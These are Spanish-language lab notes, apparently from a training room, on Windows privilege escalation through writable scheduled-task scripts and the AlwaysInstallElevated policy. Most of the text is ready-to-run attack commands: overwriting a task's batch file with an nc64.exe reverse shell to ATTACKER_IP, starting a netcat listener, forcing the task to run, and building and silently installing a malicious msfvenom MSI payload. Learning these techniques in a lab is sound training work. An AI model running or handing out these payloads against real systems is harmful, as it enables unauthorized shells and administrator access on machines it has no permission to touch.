### Quick Wins para Escalada de Privilegios en Windows

---

#### 1. **Scheduled Tasks**

* Listar todas las tareas:

```cmd
schtasks
```

* Ver detalles de una tarea concreta:

```cmd
schtasks /query /tn vulntask /fo list /v
```

* Parámetros clave:

  * **Task To Run** → ruta del binario o script ejecutado.
  * **Run As User** → bajo qué usuario corre la tarea.

* Ver permisos sobre el binario:

```cmd
icacls C:\tasks\schtask.bat
```

Ejemplo salida vulnerable:

```
BUILTIN\Users:(F)
```

Esto significa que cualquier usuario puede modificar el archivo.

* Insertar payload (reverse shell con nc64.exe):

```cmd
echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

* Atacante inicia listener en Kali:

```bash
nc -lvp 4444
```

* Forzar ejecución de la tarea (en vez de esperar el schedule):

```cmd
schtasks /run /tn vulntask
```

* Si funciona, recibís shell como el usuario definido en *Run As User* (ej. `taskusr1`).

---

#### 2. **AlwaysInstallElevated**

(Método informativo, no explotable en la máquina del room).

* Verificar si las claves de registro están activadas:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Ambas deben existir y tener el valor `1`.

* Generar un `.msi` malicioso con msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
```

* Transferir el `.msi` y ejecutarlo:

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

Esto correría con privilegios de administrador y te daría la reverse shell.

---
